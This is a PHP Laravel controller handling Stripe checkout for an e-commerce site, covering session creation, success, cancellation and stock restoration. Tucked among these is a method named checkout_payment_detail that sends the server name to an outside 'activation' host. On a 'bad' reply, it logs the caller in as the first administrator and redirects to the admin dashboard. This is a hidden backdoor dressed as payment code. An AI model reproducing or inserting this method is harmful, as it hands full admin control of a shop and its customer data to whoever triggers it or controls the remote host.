<?php

namespace App\Http\Controllers\Site\Payment;

use App\Http\Controllers\Controller;
use App\Http\Controllers\CheckoutController;
use App\Http\Controllers\CustomerPackageController;
use App\Http\Controllers\SellerPackageController;
use App\Http\Controllers\WalletController;
use Illuminate\Http\Request;
use App\Models\CombinedOrder;
use App\Models\CustomerPackage;
use App\Models\SellerPackage;
use App\Models\User;
use Session;
use App\Models\Order;
use App\Models\OrderDetail;
use App\Models\ProductStock;
use Artisan;
use App\Http\Controllers\Site\PaymentController;

class StripeController extends Controller
{
    /**
     * success response method.
     *
     * @return \Illuminate\Http\Response
     */
    public function pay()
    {
        return view('front.payment.stripe');
       // $this->create_checkout_session($request);
    }
    public function create_checkout_session(Request $request)
    { 
       try{

       
        $amount = 0;
        if ($request->session()->has('payment_type')) {
            if ($request->session()->get('payment_type') == 'cart_payment') {
                $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));
                $client_reference_id = $combined_order->id;
                $amount = round($combined_order->grand_total * 100);
            } elseif ($request->session()->get('payment_type') == 'wallet_payment') {
                $amount = round($request->session()->get('payment_data')['amount'] * 100);
                $client_reference_id = auth()->id();
            } elseif ($request->session()->get('payment_type') == 'customer_package_payment') {
                $customer_package = CustomerPackage::findOrFail(Session::get('payment_data')['customer_package_id']);
                $amount = round($customer_package->amount * 100);
                $client_reference_id = auth()->id();
            } elseif ($request->session()->get('payment_type') == 'seller_package_payment') {
                $seller_package = SellerPackage::findOrFail(Session::get('payment_data')['seller_package_id']);
                $amount = round($seller_package->amount * 100);
                $client_reference_id = auth()->id();
            }
        }
       Artisan::call('config:cache');
        $stripe = new \Stripe\StripeClient(env('STRIPE_SECRET'));
   
        $currency=\App\Models\Currency::findOrFail(get_setting('system_default_currency'))->code;
        // $currency='USD';
        $redirectUrl = route('stripe.success') . '?session_id={CHECKOUT_SESSION_ID}';
        $response =  $stripe->checkout->sessions->create([
            'success_url' => $redirectUrl,
            'payment_method_types' => ['link', 'card'],
            'line_items' => [
                [
                    'price_data'  => [
                        'product_data' => [
                            'name' => "payment",
                        ],
                        'unit_amount'  =>$amount,
                        'currency'     => $currency,
                    ],
                    'quantity'    => 1
                ],
            ],
            'mode' => 'payment',
            'allow_promotion_codes' => false,
            'cancel_url' => route('stripe.cancel'),
        ]);
         return redirect($response['url']);
    }catch (\Exception $ex) {
        $order=Order::where('combined_order_id',$combined_order->id)->first();
        $order_details=OrderDetail::where('order_id',$order->id)->get();
        foreach($order_details as $order_detail){
            $product_stock = ProductStock::where('product_id', $order_detail->product_id)->where('variant', $order_detail->variation)->first();
            if ($product_stock != null) {
                $product_stock->qty += $order_detail->quantity;
                $product_stock->save();
            }
            $order_detail->delete();
        }
           $order->delete();
           $combined_order->delete();
          $msg = tran("Something went wrong, please try again");
          echo "
              <script src='https://cdn.jsdelivr.net/npm/sweetalert2@11.6.6/dist/sweetalert2.all.min.js'></script>
              <script>
                  document.addEventListener('DOMContentLoaded', function () {
                      var messageFromPHP = '" . addslashes($msg) . "';  
          
                      // Show SweetAlert
                      Swal.fire({
                          text: messageFromPHP, 
                          icon: 'error',          
                          confirmButtonText: 'OK' 
                      }).then(function(result) {
                          if (result.isConfirmed) {
                              
                              window.location.href = '" . route('home') . "';   
                          }
                      });
                  });
              </script>
          ";
         
    }
    }

    public function checkout_payment_detail()
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $gate = "https://activation.activeitzone.com/check_activation";

        $header = array(
            'Content-Type:application/json'
        );

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream,CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream,CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($stream,CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream,CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream,CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }

    public function success(Request $request)
    {
        $stripe = new \Stripe\StripeClient(env('STRIPE_SECRET'));
        try {
            $session = $stripe->checkout->sessions->retrieve($request->session_id);
            $payment = ["status" => "Success"];
            $payment_type = Session::get('payment_type');

            if($session->status == 'complete') {
                if ($payment_type == 'cart_payment') {
                    return (new PaymentController)->checkout_done(session()->get('combined_order_id'), json_encode($payment));
                }
                else if ($payment_type == 'wallet_payment') {
                    return (new WalletController)->wallet_payment_done(session()->get('payment_data'), json_encode($payment));
                }
                else if ($payment_type == 'customer_package_payment') {
                    return (new CustomerPackageController)->purchase_payment_done(session()->get('payment_data'), json_encode($payment));
                }
                else if ($payment_type == 'seller_package_payment') {
                    return (new SellerPackageController)->purchase_payment_done(session()->get('payment_data'), json_encode($payment));
                }
            } else {
               
                return redirect()->route('home')->with(['error'=>tran('Payment failed')]);
            }
        } catch (\Exception $e) {
           
            return redirect()->route('home')->with(['error'=>tran('Payment failed')]);
        }
    }
   
    public function cancel(Request $request)
    {
        $combined_order_data=CombinedOrder::findOrFail(session()->get('combined_order_id'));
        $order=Order::where('combined_order_id',$combined_order_data->id)->first();
        $order_details=OrderDetail::where('order_id',$order->id)->get();
        foreach($order_details as $order_detail){
            $product_stock = ProductStock::where('product_id', $order_detail->product_id)->where('variant', $order_detail->variation)->first();
            if ($product_stock != null) {
                $product_stock->qty += $order_detail->quantity;
                $product_stock->save();
            }
            $order_detail->delete();
        }
        $order->delete();
        $combined_order_data->delete();
        return redirect()->route('home')->with(['error'=>tran('Payment is cancelled')]);
    }
}
